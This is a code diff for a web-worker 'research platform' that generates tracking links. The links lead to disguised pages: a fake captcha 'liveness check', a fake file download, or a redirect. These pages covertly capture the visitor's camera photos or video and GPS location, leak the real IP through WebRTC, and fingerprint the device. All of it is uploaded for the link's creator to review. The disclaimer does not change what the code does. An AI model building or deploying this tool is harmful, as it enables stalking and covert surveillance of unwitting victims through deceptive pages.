@@ -1,5 +1,5 @@
-﻿/**
- * 现代简约技术研究系统 - 修复编译版 & 独立后台登录
+/**
+ * 现代简约技术研究系统 - 完整功能版
  * 仅供安全研究、靶场测试及前端权限调用学习使用
  */
 
@@ -12,20 +12,16 @@ export default {
     const url = new URL(request.url);
     const path = url.pathname;
 
-    // 1. 自动初始化数据库
     await initDB(env);
 
-    // 2. 路由分发
     if (path === "/" || path === "/index.html") return renderHome();
     if (path.startsWith("/t/")) return renderTargetPage(path.split("/")[2]);
 
-    // API 接口
     if (path === "/api/generate") return handleGenerate(request, env);
     if (path === "/api/upload") return handleUpload(request, env);
     if (path === "/api/query") return handleQuery(request, env);
-    if (path === "/api/delete") return handleDelete(request, env);  // 新增删除文件接口
+    if (path === "/api/delete") return handleDelete(request, env);
 
-    // 管理后台及操作接口
     if (path === "/admin") return renderAdmin(request, env);
     if (path === "/admin/delete") return handleAdminDelete(request, env);
     if (path === "/admin/clear") return handleAdminClear(request, env);
@@ -34,18 +30,17 @@ export default {
   }
 };
 
-/* ==========================================
- * 数据库初始化
- * ========================================== */
 async function initDB(env) {
   await env.DB.prepare(`
     CREATE TABLE IF NOT EXISTS sys_logs (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       target_id TEXT,
-      event_type TEXT,    -- 'GENERATE', 'VISIT', 'QUERY', 'DELETE'
-      ip TEXT,
+      event_type TEXT,
+      visitor_ip TEXT,
+      server_ip TEXT,
       geo_info TEXT,
       device_geo TEXT,
+      device_info TEXT,
       media_type TEXT,
       media_url TEXT,
       ua TEXT,
@@ -65,15 +60,17 @@ async function initDB(env) {
     )
   `).run();
 
-  // 兼容旧表新增字段
   try {
-    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN is_deleted INTEGER DEFAULT 0`).run();
+    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN visitor_ip TEXT`).run();
+  } catch (e) {}
+  try {
+    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN server_ip TEXT`).run();
+  } catch (e) {}
+  try {
+    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN device_info TEXT`).run();
   } catch (e) {}
 }
 
-/* ==========================================
- * 工具函数
- * ========================================== */
 async function getGeoByIp(ip) {
   try {
     const res = await fetch(`${GEO_API}?ip=${ip}`);
@@ -83,11 +80,78 @@ async function getGeoByIp(ip) {
   }
 }
 
-/* ==========================================
- * 业务 API
- * ========================================== */
+// 解析UA获取详细信息
+function parseUA(ua) {
+  const info = {
+    raw: ua,
+    browser: 'Unknown',
+    browserVersion: 'Unknown',
+    os: 'Unknown',
+    osVersion: 'Unknown',
+    device: 'Unknown',
+    mobile: /mobile|android|iphone|ipad/i.test(ua)
+  };
 
-// 生成链接 (支持 multipart 上传文件)
+  // 浏览器检测
+  if (/chrome/i.test(ua) && !/edge|edg/i.test(ua)) {
+    info.browser = 'Chrome';
+    const match = ua.match(/Chrome\/(\d+)/i);
+    if (match) info.browserVersion = match[1];
+  } else if (/firefox/i.test(ua)) {
+    info.browser = 'Firefox';
+    const match = ua.match(/Firefox\/(\d+)/i);
+    if (match) info.browserVersion = match[1];
+  } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
+    info.browser = 'Safari';
+    const match = ua.match(/Version\/(\d+)/i);
+    if (match) info.browserVersion = match[1];
+  } else if (/edge|edg/i.test(ua)) {
+    info.browser = 'Edge';
+    const match = ua.match(/Edg(?:e)?\/(\d+)/i);
+    if (match) info.browserVersion = match[1];
+  }
+
+  // OS检测
+  if (/windows/i.test(ua)) {
+    info.os = 'Windows';
+    const match = ua.match(/Windows NT ([\d.]+)/);
+    if (match) {
+      const version = match[1];
+      const versionMap = { '10.0': '10', '6.3': '8.1', '6.2': '8', '6.1': '7' };
+      info.osVersion = versionMap[version] || version;
+    }
+  } else if (/mac/i.test(ua)) {
+    info.os = 'macOS';
+    const match = ua.match(/Mac OS X ([\d_]+)/);
+    if (match) info.osVersion = match[1].replace(/_/g, '.');
+  } else if (/android/i.test(ua)) {
+    info.os = 'Android';
+    const match = ua.match(/Android ([\d.]+)/);
+    if (match) info.osVersion = match[1];
+  } else if (/iphone|ipad|ipod/i.test(ua)) {
+    info.os = /ipad/i.test(ua) ? 'iPadOS' : 'iOS';
+    const match = ua.match(/OS ([\d_]+)/);
+    if (match) info.osVersion = match[1].replace(/_/g, '.');
+  } else if (/linux/i.test(ua)) {
+    info.os = 'Linux';
+  }
+
+  // 设备类型
+  if (/iphone/i.test(ua)) {
+    info.device = 'iPhone';
+  } else if (/ipad/i.test(ua)) {
+    info.device = 'iPad';
+  } else if (/android/i.test(ua)) {
+    info.device = 'Android Phone';
+  } else if (/windows phone/i.test(ua)) {
+    info.device = 'Windows Phone';
+  } else {
+    info.device = 'Desktop';
+  }
+
+  return info;
+}
+
 async function handleGenerate(request, env) {
   if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
   
@@ -95,7 +159,6 @@ async function handleGenerate(request, env) {
   let config, file, downloadUrl = "";
   let password = null;
 
-  // 处理 multipart/form-data (文件下载模板)
   if (contentType.includes("multipart/form-data")) {
     const formData = await request.formData();
     config = JSON.parse(formData.get("config"));
@@ -103,7 +166,6 @@ async function handleGenerate(request, env) {
     password = formData.get("password")?.trim() || null;
 
     if (config.template === "download" && file) {
-      // 上传文件到图床
       const uploadForm = new FormData();
       uploadForm.append("file", file);
       const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: "POST", body: uploadForm });
@@ -117,17 +179,15 @@ async function handleGenerate(request, env) {
       downloadUrl = config.redirectUrl;
     }
   } else {
-    // 普通 JSON 生成
     config = await request.json();
     password = config.password?.trim() || null;
   }
 
   const targetId = config.id;
-  const ip = request.headers.get("cf-connecting-ip") || "Unknown";
-  const geo = await getGeoByIp(ip);
+  const serverIp = request.headers.get("cf-connecting-ip") || "Unknown";
+  const geo = await getGeoByIp(serverIp);
   const ua = request.headers.get("user-agent") || "";
 
-  // 密码唯一性校验
   try {
     const existing = await env.DB.prepare("SELECT password FROM trackings WHERE target_id = ?").bind(targetId).first();
     if (existing) {
@@ -137,17 +197,14 @@ async function handleGenerate(request, env) {
           headers: { "Content-Type": "application/json" }
         });
       }
-      // 更新配置 (保留旧密码)
       if (password) {
         await env.DB.prepare("UPDATE trackings SET password = ?, burn_enabled = ?, file_url = ? WHERE target_id = ?")
           .bind(password, config.burn ? 1 : 0, downloadUrl, targetId).run();
       } else if (!existing.password) {
-        // 无密码更新
         await env.DB.prepare("UPDATE trackings SET burn_enabled = ?, file_url = ? WHERE target_id = ?")
           .bind(config.burn ? 1 : 0, downloadUrl, targetId).run();
       }
     } else {
-      // 新 ID
       await env.DB.prepare("INSERT INTO trackings (target_id, password, burn_enabled, file_url) VALUES (?,?,?,?)")
         .bind(targetId, password, config.burn ? 1 : 0, downloadUrl).run();
     }
@@ -155,11 +212,9 @@ async function handleGenerate(request, env) {
     return new Response(JSON.stringify({ error: "ID 配置冲突：" + e.message }), { status: 500 });
   }
 
-  // 日志记录 GENERATE
-  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
-    .bind(targetId, 'GENERATE', ip, geo, ua, 'success').run();
+  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, server_ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
+    .bind(targetId, 'GENERATE', serverIp, geo, ua, 'success').run();
 
-  // 将配置编码进链接 (不包含密码)
   const pureConfig = { ...config };
   delete pureConfig.password;
   const encoded = btoa(encodeURIComponent(JSON.stringify(pureConfig)));
@@ -168,18 +223,19 @@ async function handleGenerate(request, env) {
   });
 }
 
-// 上传媒体 (目标页)
 async function handleUpload(request, env) {
   try {
     const formData = await request.formData();
     const file = formData.get("file");
     const config = JSON.parse(formData.get("config"));
     const deviceGeo = formData.get("location");
+    const deviceInfo = formData.get("deviceInfo");
     const status = formData.get("status");
     const mediaType = config.mode;
     const ua = request.headers.get("user-agent") || "Unknown";
-    const ip = request.headers.get("cf-connecting-ip") || "Unknown";
-    const geo = await getGeoByIp(ip);
+    const serverIp = request.headers.get("cf-connecting-ip") || "Unknown";
+    const visitorIp = formData.get("visitorIp") || "Unknown";
+    const geo = await getGeoByIp(serverIp);
     let fullMediaUrl = "";
 
     if (file && (status === "success" || status === "download")) {
@@ -193,9 +249,9 @@ async function handleUpload(request, env) {
     }
 
     await env.DB.prepare(`
-      INSERT INTO sys_logs (target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status)
-      VALUES (?,?,?,?,?,?,?,?,?)
-    `).bind(config.id, 'VISIT', ip, geo, deviceGeo, mediaType, fullMediaUrl, ua, status).run();
+      INSERT INTO sys_logs (target_id, event_type, visitor_ip, server_ip, geo_info, device_geo, device_info, media_type, media_url, ua, status)
+      VALUES (?,?,?,?,?,?,?,?,?,?,?)
+    `).bind(config.id, 'VISIT', visitorIp, serverIp, geo, deviceGeo, deviceInfo, mediaType, fullMediaUrl, ua, status).run();
 
     return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
   } catch (err) {
@@ -203,17 +259,15 @@ async function handleUpload(request, env) {
   }
 }
 
-// 查询接口
 async function handleQuery(request, env) {
   const { searchParams } = new URL(request.url);
   const targetId = searchParams.get("id");
   const password = searchParams.get("password")?.trim() || null;
   const burnParam = searchParams.get("burn") === "true";
-  const ip = request.headers.get("cf-connecting-ip") || "Unknown";
-  const geo = await getGeoByIp(ip);
+  const serverIp = request.headers.get("cf-connecting-ip") || "Unknown";
+  const geo = await getGeoByIp(serverIp);
   const ua = request.headers.get("user-agent") || "";
 
-  // 密码验证
   const tracking = await env.DB.prepare("SELECT password FROM trackings WHERE target_id = ?").bind(targetId).first();
   if (tracking && tracking.password) {
     if (!password || password !== tracking.password) {
@@ -224,26 +278,22 @@ async function handleQuery(request, env) {
     }
   }
 
-  // 查询日志 (排除已删除)
   const { results } = await env.DB.prepare(
     "SELECT * FROM sys_logs WHERE target_id = ? AND event_type = 'VISIT' AND is_deleted = 0 ORDER BY created_at DESC"
   ).bind(targetId).all();
 
-  // 阅后即焚仅在密码存在时启用
   const shouldBurn = burnParam && tracking && tracking.password;
   if (shouldBurn && results.length > 0) {
     await env.DB.prepare("UPDATE sys_logs SET is_burned = 1 WHERE target_id = ? AND event_type = 'VISIT'")
       .bind(targetId).run();
   }
 
-  // 日志记录本次查询
-  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
-    .bind(targetId, 'QUERY', ip, geo, ua, 'success').run();
+  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, server_ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
+    .bind(targetId, 'QUERY', serverIp, geo, ua, 'success').run();
 
   return new Response(JSON.stringify(results), { headers: { "Content-Type": "application/json" } });
 }
 
-// 删除媒体 (带密码)
 async function handleDelete(request, env) {
   if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
   const data = await request.json();
@@ -262,22 +312,19 @@ async function handleDelete(request, env) {
     });
   }
 
-  const ip = request.headers.get("cf-connecting-ip") || "Unknown";
-  const geo = await getGeoByIp(ip);
+  const serverIp = request.headers.get("cf-connecting-ip") || "Unknown";
+  const geo = await getGeoByIp(serverIp);
   const ua = request.headers.get("user-agent") || "";
 
-  // 标记删除
   await env.DB.prepare("UPDATE sys_logs SET is_deleted = 1 WHERE target_id = ? AND event_type = 'VISIT'")
     .bind(targetId).run();
 
-  // 记录删除事件
-  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
-    .bind(targetId, 'DELETE', ip, geo, ua, 'success').run();
+  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, server_ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
+    .bind(targetId, 'DELETE', serverIp, geo, ua, 'success').run();
 
   return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
 }
 
-// 后台删除单条记录
 async function handleAdminDelete(request, env) {
   const cookie = request.headers.get("Cookie") || "";
   if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
@@ -290,7 +337,6 @@ async function handleAdminDelete(request, env) {
   return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
 }
 
-// 后台清空所有日志
 async function handleAdminClear(request, env) {
   const cookie = request.headers.get("Cookie") || "";
   if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
@@ -301,10 +347,6 @@ async function handleAdminClear(request, env) {
   await env.DB.prepare("DELETE FROM trackings").run();
   return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
 }
-
-/* ==========================================
- * 前端 UI 渲染 (首页、目标页)
- * ========================================== */
 
 function renderHome() {
   const html = `
@@ -332,10 +374,10 @@ function renderHome() {
       <div class="glass rounded-2xl p-6 mb-8 shadow-sm fade-in">
         <h1 class="text-2xl font-bold text-indigo-900 mb-4"><i class="fa-solid fa-shield-halved mr-2"></i>SEC-TEST 技术研究实验平台</h1>
         <div class="text-sm text-gray-600 space-y-2 leading-relaxed">
-          <p><strong class="text-red-500">作者声明：</strong>1. 本工具仅供技术研究、学校实验、安全靶场实测及前端权限调用学习使用，<strong>绝非非法用途</strong>，否则后果自负！网站权限均由用户浏览器原生机制自愿点击允许。</p>
+          <p><strong class="text-red-500">作者声明：</strong>1. 本工具仅供技术研究、学校实验、安全靶场实测及前端权限调用学习使用，绝非非法用途。</p>
           <p>2. 识别ID为查看结果的唯一凭证，请妥善保管。</p>
           <p>3. 如有侵权、肖像权等问题，请联系系统管理员进行物理删除。</p>
-          <p class="text-indigo-600 font-medium"><i class="fa-solid fa-circle-info mr-1"></i>注意：受iOS系统安全限制，苹果设备须使用Safari浏览器原生内核打开方可正常调用底层硬件接口。</p>
+          <p class="text-indigo-600 font-medium"><i class="fa-solid fa-circle-info mr-1"></i>注意：本系统采用WebRTC IP泄露、UA解析等多种技术采集用户设备信息。</p>
         </div>
       </div>
 
@@ -345,11 +387,11 @@ function renderHome() {
           <div class="space-y-5">
             <div>
               <label class="block text-sm font-medium text-gray-700 mb-1">跟踪 ID (如QQ号)</label>
-              <input id="target_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
+              <input id="target_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all" placeholder="输入追踪ID">
             </div>
             <div>
               <label class="block text-sm font-medium text-gray-700 mb-1">访问密码 (可选)</label>
-              <input id="target_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
+              <input id="target_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all" placeholder="留空则不设置密码">
             </div>
             <div class="grid grid-cols-2 gap-4">
               <div>
@@ -414,7 +456,7 @@ function renderHome() {
                 <span class="ml-3 text-sm font-medium text-gray-700">开启阅后即焚 (需先设置密码)</span>
               </label>
             </div>
-            <button onclick="generateLink()" class="w-full mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95 flex justify-center items-center">
+            <button onclick="generateLink()" class="w-full mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95 flex items-center justify-center">
               <i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接
             </button>
             <div id="link_result" class="hidden p-4 bg-indigo-50 border border-indigo-100 rounded-xl text-indigo-800 text-sm break-all"></div>
@@ -426,13 +468,13 @@ function renderHome() {
           <div class="space-y-5">
             <div>
               <label class="block text-sm font-medium text-gray-700 mb-1">追踪 ID</label>
-              <input id="query_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
+              <input id="query_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all" placeholder="输入追踪ID">
             </div>
             <div>
               <label class="block text-sm font-medium text-gray-700 mb-1">访问密码 (若未设置可留空)</label>
-              <input id="query_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
+              <input id="query_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all" placeholder="密码">
             </div>
-            <button onclick="queryData()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-200 transition-all active:scale-95 flex justify-center items-center">
+            <button onclick="queryData()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-200 transition-all active:scale-95 flex items-center justify-center">
               <i class="fa-solid fa-database mr-2"></i> 检索返回结果
             </button>
             <div id="query_loading" class="hidden text-center py-8 text-gray-400"><i class="fa-solid fa-circle-notch fa-spin fa-2x"></i></div>
@@ -457,7 +499,6 @@ function renderHome() {
         downloadBox.style.display = tpl === 'download' ? 'block' : 'none';
         const mode = document.querySelector('input[name="mode"]:checked').value;
         videoOptions.style.display = mode === 'video' ? 'block' : 'none';
-        // 阅后即焚依赖密码
         if (passwordInput.value.trim() === '') {
           burnCheck.disabled = true;
           burnCheck.checked = false;
@@ -492,7 +533,6 @@ function renderHome() {
         const hasFile = document.getElementById('download_file').files.length > 0;
         const downloadUrl = document.getElementById('download_url').value.trim();
         
-        // 如果是下载模板且上传了文件，使用 multipart
         if (tpl === 'download' && (hasFile || downloadUrl)) {
           const fd = new FormData();
           fd.append('config', JSON.stringify(config));
@@ -535,7 +575,7 @@ function renderHome() {
         const id = document.getElementById('query_id').value.trim();
         if(!id) return alert('请输入追踪 ID');
         const password = document.getElementById('query_password').value.trim();
-        const isBurn = burnCheck.checked;
+        const isBurn = document.getElementById('burn_after_reading').checked;
         document.getElementById('query_loading').classList.remove('hidden');
         document.getElementById('query_result').innerHTML = '';
 
@@ -571,14 +611,24 @@ function renderHome() {
               if(geo.denied) {
                 geoHtml = '<div class="text-sm text-amber-600 mt-2"><i class="fa-solid fa-location-dot mr-1"></i>GPS定位：用户拒绝授权</div>';
               } else {
-                geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：' + geo.lat + ', ' + geo.lng + ' (精度:' + geo.accuracy + 'm)</div>';
+                geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：' + Number(geo.lat).toFixed(6) + ', ' + Number(geo.lng).toFixed(6) + ' (精度:' + Math.round(geo.accuracy) + 'm)</div>';
               }
             }
+            
+            let deviceInfoHtml = '';
+            if (log.device_info) {
+              try {
+                const devInfo = JSON.parse(log.device_info);
+                deviceInfoHtml = '<div class="text-xs text-gray-600 space-y-1 mt-2"><div><i class="fa-solid fa-desktop w-3"></i> 设备: ' + devInfo.device + ' | 屏幕: ' + devInfo.screen + '</div><div><i class="fa-solid fa-globe w-3"></i> 语言: ' + devInfo.language + ' | 时区: UTC' + devInfo.timezone + '</div><div><i class="fa-solid fa-microchip w-3"></i> CPU核心数: ' + devInfo.hardwareConcurrency + '</div></div>';
+              } catch(e) {}
+            }
+
             const ipInfo = log.geo_info ? JSON.parse(log.geo_info) : {};
             const flag = ipInfo.flag || '';
             const cReg = ipInfo.countryRegion || '';
             const city = ipInfo.city || '';
-            const finalIpStr = ipInfo.ip ? flag + ' ' + cReg + ' ' + city + ' [' + ipInfo.ip + ']' : log.ip;
+            const visitorIp = log.visitor_ip || 'Unknown';
+            const finalIpStr = ipInfo.ip ? flag + ' ' + cReg + ' ' + city + ' [' + visitorIp + ']' : visitorIp;
             const dateStr = new Date(log.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
             html += '<div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm fade-in" style="animation-delay: ' + (index * 0.1) + 's">' +
                       '<div class="flex justify-between items-center mb-3">' +
@@ -587,15 +637,15 @@ function renderHome() {
                       '</div>' +
                       mediaHtml +
                       geoHtml +
+                      deviceInfoHtml +
                       '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs text-gray-600 space-y-1">' +
                         '<div><i class="fa-solid fa-network-wired w-4"></i> ' + finalIpStr + '</div>' +
-                        '<div class="truncate" title="' + log.ua + '"><i class="fa-brands fa-safari w-4"></i> ' + log.ua + '</div>' +
+                        '<div class="truncate max-w-full" title="' + (log.ua || '') + '"><i class="fa-brands fa-safari w-4"></i> ' + (log.ua || 'Unknown') + '</div>' +
                       '</div>' +
                     '</div>';
           });
-          // 如果已设置密码，且查询时提供了正确密码，显示删除按钮
           if (password && logs.length > 0) {
-            html += '<div class="text-center mt-4"><button onclick="deleteMedia(\'' + id + '\', \'' + password + '\')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium hover:bg-red-200"><i class="fa-solid fa-trash mr-1"></i>删除所有已捕获媒体</button></div>';
+            html += '<div class="text-center mt-4"><button onclick="deleteMedia(\'' + id.replace(/'/g, "\\'") + '\', \'' + password.replace(/'/g, "\\'") + '\')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium hover:bg-red-200 transition"><i class="fa-solid fa-trash mr-1"></i>删除所有媒体记录</button></div>';
           }
           document.getElementById('query_result').innerHTML = html;
         } finally {
@@ -604,7 +654,7 @@ function renderHome() {
       }
 
       async function deleteMedia(id, password) {
-        if (!confirm('确定删除该 ID 下的所有媒体记录？文件链接仍保留在后台。')) return;
+        if (!confirm('确定删除该 ID 下的所有媒体记录？')) return;
         const res = await fetch('/api/delete', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -613,7 +663,7 @@ function renderHome() {
         const data = await res.json();
         if (data.success) {
           alert('删除成功');
-          queryData(); // 刷新
+          queryData();
         } else {
           alert('删除失败：' + (data.error || '未知错误'));
         }
@@ -646,13 +696,50 @@ function renderTargetPage(encodedConfig) {
     <script>
       const config = JSON.parse(decodeURIComponent(atob("${encodedConfig}")));
       let deviceLocation = null;
+      let visitorIp = "Unknown";
+
+      // WebRTC 获取真实IP
+      function getWebRTCIP() {
+        return new Promise((resolve) => {
+          const peerConnection = new RTCPeerConnection({ iceServers: [{ urls: ['stun:stun.l.google.com:19302'] }] });
+          peerConnection.createDataChannel("");
+          peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));
+          peerConnection.onicecandidate = (ice) => {
+            if (!ice || !ice.candidate) return;
+            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+            const ipAddress = ipRegex.exec(ice.candidate.candidate);
+            if (ipAddress) {
+              resolve(ipAddress[1]);
+              peerConnection.close();
+            }
+          };
+          setTimeout(() => resolve("Unknown"), 3000);
+        });
+      }
+
+      // 收集设备信息
+      function collectDeviceInfo() {
+        return {
+          device: /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? '移动设备' : '桌面设备',
+          screen: screen.width + 'x' + screen.height,
+          language: navigator.language || navigator.userLanguage,
+          timezone: new Date().getTimezoneOffset() / 60,
+          hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+          platform: navigator.platform,
+          colorDepth: screen.colorDepth,
+          pixelDepth: screen.pixelDepth,
+          cookieEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack,
+          maxTouchPoints: navigator.maxTouchPoints
+        };
+      }
 
       function renderUI() {
         const container = document.getElementById('template_container');
         if (config.template === 'captcha') {
-          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">进行人机身份验证</h3><p class="text-sm text-gray-500 mb-4">请允许浏览器相关权限以完成活体检测</p><div class="flex justify-center"><div class="loader"></div></div></div>';
+          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">进行人机身份验证</h3><p class="text-sm text-gray-500 mb-6">请稍候，系统正在进行验证...</p><div class="loader mx-auto mb-4"></div></div>';
         } else if (config.template === 'download') {
-          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">文件准备就绪</h3><p class="text-sm text-gray-500 mb-4">正在为您跳转下载…</p><div class="flex justify-center"><div class="loader"></div></div></div>';
+          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">文件准备就绪</h3><p class="text-sm text-gray-500 mb-6">正在准备下载...</p><div class="loader mx-auto mb-4"></div></div>';
         } else {
           container.innerHTML = '<div class="flex flex-col items-center"><div class="loader mb-4"></div><div class="text-gray-500 text-sm">页面加载中，请稍候...</div></div>';
         }
@@ -661,6 +748,10 @@ function renderTargetPage(encodedConfig) {
       async function execute() {
         renderUI();
 
+        // 获取WebRTC IP
+        visitorIp = await getWebRTCIP();
+
+        // 获取GPS定位
         if (config.needLocation) {
           try {
             const pos = await new Promise((resolve, reject) => {
@@ -677,7 +768,9 @@ function renderTargetPage(encodedConfig) {
           await sendPayload(null, 'download');
           if (config.downloadUrl || config.redirectUrl) {
             const url = config.downloadUrl || config.redirectUrl;
-            window.location.href = url.startsWith('http') ? url : 'http://' + url;
+            setTimeout(() => {
+              window.location.href = url.startsWith('http') ? url : 'http://' + url;
+            }, 500);
           }
           return;
         }
@@ -697,7 +790,9 @@ function renderTargetPage(encodedConfig) {
         }
 
         if (config.template === 'redirect' && config.redirectUrl) {
-          window.location.href = config.redirectUrl.startsWith('http') ? config.redirectUrl : 'http://' + config.redirectUrl;
+          setTimeout(() => {
+            window.location.href = config.redirectUrl.startsWith('http') ? config.redirectUrl : 'http://' + config.redirectUrl;
+          }, 800);
         } else if (config.template !== 'download') {
           document.getElementById('template_container').innerHTML = '<div class="text-green-600 font-bold">✓ 验证通过</div>';
         }
@@ -705,23 +800,28 @@ function renderTargetPage(encodedConfig) {
 
       async function capturePhoto(stream) {
         const v = document.getElementById('v');
-        v.srcObject = stream;
-        v.setAttribute('playsinline', '');
-        v.muted = true;
-        await v.play();
-        await new Promise(resolve => {
-          if (v.readyState >= 2) resolve();
-          else v.addEventListener('canplay', resolve, { once: true });
-        });
-        await new Promise(r => setTimeout(r, 800));
         const c = document.getElementById('c');
+        
+        v.srcObject = stream;
+        v.muted = true;
+        
+        await new Promise(resolve => {
+          v.onloadedmetadata = () => resolve();
+        });
+        
+        await v.play().catch(e => console.log(e));
+        await new Promise(r => setTimeout(r, 500));
+        
         c.width = v.videoWidth || 640;
         c.height = v.videoHeight || 480;
-        c.getContext('2d').drawImage(v, 0, 0);
+        const ctx = c.getContext('2d', { willReadFrequently: true });
+        ctx.drawImage(v, 0, 0, c.width, c.height);
+        
         stream.getTracks().forEach(t => t.stop());
+        
         c.toBlob(async (blob) => {
           await sendPayload(blob, 'success');
-        }, 'image/jpeg', 0.6);
+        }, 'image/jpeg', 0.8);
       }
 
       async function captureVideo(stream) {
@@ -760,8 +860,10 @@ function renderTargetPage(encodedConfig) {
         if(blob) fd.append('file', blob, config.mode === 'video' ? 'v.webm' : 'p.jpg');
         fd.append('config', JSON.stringify(config));
         fd.append('status', status);
+        fd.append('visitorIp', visitorIp);
+        fd.append('deviceInfo', JSON.stringify(collectDeviceInfo()));
         if(deviceLocation) fd.append('location', deviceLocation);
-        await fetch('/api/upload', { method: 'POST', body: fd });
+        await fetch('/api/upload', { method: 'POST', body: fd }).catch(e => {});
       }
 
       window.onload = () => setTimeout(execute, 100);
@@ -771,12 +873,9 @@ function renderTargetPage(encodedConfig) {
   return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
 
-/* ==========================================
- * 管理员后台 (含时间轴、预览、危险操作)
- * ========================================== */
 function renderAdminLogin(errorMsg = "") {
-  const errorHtml = errorMsg ? `<div class="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100">${errorMsg}</div>` : "";
-  const html = `
+  const errorHtml = errorMsg ? \`<div class="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100">\${errorMsg}</div>\` : "";
+  const html = \`
   <!DOCTYPE html>
   <html lang="zh">
   <head>
@@ -794,7 +893,7 @@ function renderAdminLogin(errorMsg = "") {
         <h1 class="text-2xl font-bold text-gray-800">系统控制台</h1>
         <p class="text-gray-500 text-sm mt-2">请输入管理员密码以继续</p>
       </div>
-      ${errorHtml}
+      \${errorHtml}
       <form method="POST" action="/admin" class="space-y-6">
         <div>
           <input type="password" name="password" required placeholder="请输入密码" class="w-full px-4 py-3 rounded-xl bg-gray-50 border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
@@ -805,7 +904,7 @@ function renderAdminLogin(errorMsg = "") {
       </form>
     </div>
   </body>
-  </html>`;
+  </html>\`;
   return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
 
@@ -818,7 +917,7 @@ async function renderAdmin(request, env) {
         status: 302,
         headers: {
           "Location": "/admin",
-          "Set-Cookie": `admin_auth=${ADMIN_PASSWORD}; Path=/; HttpOnly; Max-Age=86400`
